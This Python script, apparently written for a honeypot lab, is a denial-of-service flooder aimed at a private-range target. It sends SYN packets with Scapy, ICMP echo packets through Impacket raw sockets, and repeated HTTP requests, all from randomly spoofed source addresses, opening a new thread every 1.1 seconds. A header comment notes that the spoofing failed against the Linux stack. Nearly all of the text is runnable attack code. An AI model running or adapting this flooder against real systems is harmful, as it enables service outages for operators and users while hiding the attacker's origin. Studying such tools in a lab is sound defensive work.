#!/usr/bin/python

# Note: this program successfully generated spoofed packets which arrived at the
# HoneyPot. However, it appears the Linux IP stack is sophisticated enough to know
# that the IP's are spoofed and silently ignored them. Firewalld never even blocks them.
# We found 3 sppofing Python programs on the internet, none of them worked but between
# the 3 of them we were able to craft the script below.

import time, os, sys, string, thread, socket
from impacket import ImpactDecoder, ImpactPacket ##Using custom Python library to help with IP Spoofing
from scapy.all import *
conf.verb=0

print("DDoS Attack Starting: IP Spoof Test")

#Our target's IP:
target_ip = '192.168.56.105'
port = 8080
message = "12345"

def ddos(src, dst):
	#Create a new IP packet and set its source and destination addresses

	ip = ImpactPacket.IP()
	ip.set_ip_src(src)
	ip.set_ip_dst(dst)

	#Create a new ICMP packet

	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHO)

	#inlude a small payload inside the ICMP packet
	#and have the ip packet contain the ICMP packet
	icmp.contains(ImpactPacket.Data("O"*100))
	ip.contains(icmp)
	n = 0

	while(1):
		print("Spoofing from %s" % src)

		#Using Scapy to SYN flood
		p1=IP(dst=target_ip,src=src)/TCP(dport=8080,sport=5000,flags='S')
		send(p1)
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

		#Using ImpactPacket to flood/spoof
		icmp.set_icmp_id(1)
		#calculate checksum
		icmp.set_icmp_cksum(0)
		icmp.auto_checksum = 0
		s.sendto(ip.get_packet(), (dst, 8080))

		#Regular socket connection
		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ddos.connect((target_ip, port))
		ddos.send("GET /%s HTTP/1.1\r\n" % message)

# Randomizing IP Values and make new threads
while(1):
	src = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
	thread.start_new_thread(ddos, (src, target_ip))
	time.sleep(1.1)
